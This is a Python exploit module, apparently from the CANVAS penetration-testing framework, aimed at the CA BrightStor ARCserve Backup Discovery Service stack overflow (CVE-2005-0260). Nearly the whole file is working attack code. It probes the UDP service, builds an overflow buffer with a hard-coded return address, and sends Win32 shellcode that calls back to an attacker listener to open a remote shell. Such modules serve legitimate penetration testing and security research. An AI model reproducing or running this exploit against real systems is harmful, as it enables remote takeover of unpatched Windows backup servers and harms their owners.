#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2005-2007
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

import os
import getopt
import socket
import time
import struct

# CANVAS modules
from exploitutils import *
from tcpexploit import *
from MOSDEF import mosdef

NAME='CA BrightStor ARCserve Backup Discovery Service Overflow'
DESCRIPTION='CA BrightStor ARCserve Backup Discovery Service Stack Overflow'

DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Computer Associates"
DOCUMENTATION['Date public']='02/09/05'
DOCUMENTATION['References']='http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=194'
DOCUMENTATION['Repeatability']=''
DOCUMENTATION['VersionsAffected']=''
DOCUMENTATION['CVE Name'] = 'CVE-2005-0260'
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-0260'
DOCUMENTATION['CVSS'] = 10.0


VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Remote'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['NT','2000','XP','2003']

NOTES="""
"""

CHANGELOG="""
KK 08/14/07:
- Rewritten
"""

targets={
    0: ['Autodetect (N/A)',0],
    1: ['CA BrightStor ARCserve Backup r11.0',0x2380158c] #call edi
}

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.setInfo(DESCRIPTION)
        self.name=NAME
        self.port=41524
        self.version=0
        self.badstring='\0'
        return

    def neededListenerTypes(self):
        import canvasengine
        return [canvasengine.WIN32MOSDEF]
    
    def createShellcode(self):
        return self.createWin32Shellcode(self.badstring,self.callback.ip,self.callback.port)

    def getArgs(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get('port',self.port))
        return

    def test(self):
        self.getArgs()
        self.log('%s testing host %s:%s'%(self.name,self.host,self.port))
        s=self.getudpsock()
        s.set_timeout(4)
        try:
            s.connect((self.host,self.port))
        except:
            self.log('No connection could be established')
            return 0        
        s.send('AAAA')
        try:
            data=s.recv(256)
        except timeoutsocket.Timeout,m:
            self.log('Nothing returned, but we will assume the target is vulnerable')
            self.version=1
            return 1
        except:
           self.log('Connection refused')
           return 0
        self.log('Received: %s'%(prettyprint(data)))
        self.version=1
        return 1

    def run(self):
        self.getArgs()
        self.setInfo('%s attacking %s:%d (in progress)'%(NAME,self.host,self.port))
        if self.version==0:
            self.test()
            if self.version==0:
                self.log('Could not determine version automatically')
                self.setInfo('%s attacking %s:%d - done (failed!)'%(NAME,self.host,self.port))
                return 0
        self.info,self.eip=targets[self.version]
        self.log('Attacking %s:%d'%(self.host,self.port))

        message='Received message from %s(size: %d). Server: '%(self.callback.ip,1000)

        buffer=''
        buffer+='A'*(0x401-len(message))
        buffer+=struct.pack('<L',self.eip)
        buffer+='B'*0x47
        buffer+=self.shellcode

        s=self.getudpsock()
        s.connect((self.host,self.port))
        s.send(buffer)
        time.sleep(2)
        if self.ISucceeded():
            self.setInfo('%s attacking %s:%d - done (success!)'%(NAME,self.host,self.port))
            return 1
        else:
            self.setInfo('%s attacking %s:%d - done (failed)'%(NAME,self.host,self.port))
            return 0

    def displayVersions(self):
        i=0
        print 'Available versions:'
        for listline in targets.values():
            print '\t%d: %s'%(i,listline[0])
            i+=1

if __name__=='__main__':
    print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
    app=theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
